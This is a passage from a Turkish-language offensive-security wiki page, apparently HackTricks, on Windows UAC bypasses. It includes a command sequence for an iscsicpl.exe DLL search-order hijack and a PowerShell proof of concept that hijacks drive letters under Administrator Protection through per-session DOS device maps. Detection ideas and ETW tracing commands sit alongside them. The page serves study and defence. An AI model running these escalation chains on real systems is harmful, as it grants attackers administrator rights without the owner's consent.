- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşimidir; bu nedenle diğer UAC bypass yöntemleri için kullanılan aynı ProcMon workflow'u eksik DLL yüklemesini doğrulamak için yararlıdır.

Minimal akış:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Tespit fikirleri:
- `reg add` / `HKCU\Environment\Path` konumuna registry yazma işlemlerinin hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasını uyarı olarak işaretleyin.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı tarafından kontrol edilen** konumlarda `iscsiexe.dll` dosyasını arayın.
- `iscsicpl.exe` başlatmalarını, beklenmeyen child process'ler veya normal Windows dizinleri dışından yapılan DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı zincirler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** işlemlerini zincirleyerek `ctfmon.exe` ve daha sonra `fodhelper.exe` gibi güvenilir UI / auto-elevated binary'ler üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrarlamak yerine aşağıdaki konumdaki kompakt payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Per-logon-session DOS device map üzerinden Administrator Protection (preview) drive-letter hijack

> [!NOTE]
> Ağustos 2026 itibarıyla Microsoft, Administrator Protection özelliğini hâlâ **Insider preview** olarak belgeliyor: Ekim 2025'teki rollout geri alındı ve daha sonraki bir tarih için planlanıyor. Bu zincirleri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; standart bir 25H2 version string tek başına özelliğin etkin olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>

Windows 11 25H2 preview build'lerindeki tüm `RAiLaunchAdminProcess` / UIAccess attack surface'i için özel sayfayı inceleyin:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'lar kullanır. Dizin, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse dizin, saldırgan **owner** olacak şekilde oluşturulur (`CREATOR OWNER`'ı devralır); bu da `\GLOBAL??` önceliğini aşan drive-letter link'lerine izin verir.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük ayrıcalıklı bir session'dan, prompt göstermeyen bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve `\Sessions\0\DosDevices/<LUID>` dizininin saldırgan sahipliğinde oluşturulmasını zorlamak için `\??` açarken bu token'ı impersonate edin.
3. Buraya saldırganın kontrolündeki storage'ı gösteren bir `C:` symlink'i oluşturun; sonraki filesystem erişimleri bu session içinde `C:` konumunu saldırgan path'ine resolve ederek prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Önizleme ana bilgisayarlarında Administrator Protection, onayları ve başarısızlıkları `Microsoft-Windows-LUA` provider'ı altında ETW event'leri **15031** ve **15032** olarak kaydeder. Event'ler, istekte bulunanın SID'sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve authentication method'unu içerir; bu nedenle tekrarlanan exploit girişimleri veya başarısız UI yönlendirmeleri telemetry'den yoksun değildir.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümet hedeflerine karşı 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip ve Narrator Always Notify bypass'ları](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET'ten Local Windows RPC Server'larını çağırma](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte, Signed Windows Kernel Rootkit ile CoolClient'ı geliştiriyor](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
